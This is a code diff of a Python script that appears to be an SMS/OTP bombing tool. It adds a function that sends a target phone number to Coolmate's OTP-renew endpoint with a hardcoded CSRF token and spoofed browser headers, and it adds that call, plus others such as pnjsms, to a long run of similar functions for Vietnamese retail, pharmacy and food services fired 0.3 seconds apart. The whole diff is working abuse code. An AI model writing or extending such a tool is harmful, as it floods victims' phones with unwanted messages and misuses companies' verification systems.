+        'referer': 'https://www.coolmate.me/account/register',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-csrf-token': 'q5YgFB6c3H2kmd2OH55Y5LRduCE61mM6mW5WKxpX',
+    }
+
+    json_data = {
+        'phone': sdt,
+        'type': 'register',
+    }
+
+    try:
+        response = requests.post('https://www.coolmate.me/otp/renew', cookies=cookies, headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("COOLMATERESEND | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("COOLMATERESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
 tv360()
 time.sleep(0.3)
 beautybox()
@@ -3710,8 +3734,6 @@ time.sleep(0.3)
 oreka()
 time.sleep(0.3)
 fmstyle()
-time.sleep(0.3)
-circa()
 time.sleep(0.3)
 acfc()
 time.sleep(0.3)
@@ -3789,6 +3811,8 @@ medigozl()
 time.sleep(0.3)
 ddmevabereg()
 time.sleep(0.3)
+pnjsms()
+time.sleep(0.3)
 pharmartzl()
 time.sleep(0.3)
 jiohealth()
@@ -3796,6 +3820,8 @@ time.sleep(0.3)
 ddmevabe()
 time.sleep(0.3)
 nhathuocankhang()
+time.sleep(0.3)
+coolmateresend()
 time.sleep(0.3)
 mutosi()
 time.sleep(0.3)
@@ -3826,4 +3852,6 @@ time.sleep(0.3)
 gofood()
 time.sleep(0.3)
 pasgo()
+time.sleep(0.3)
+coolmatereset()
 time.sleep(0.3)
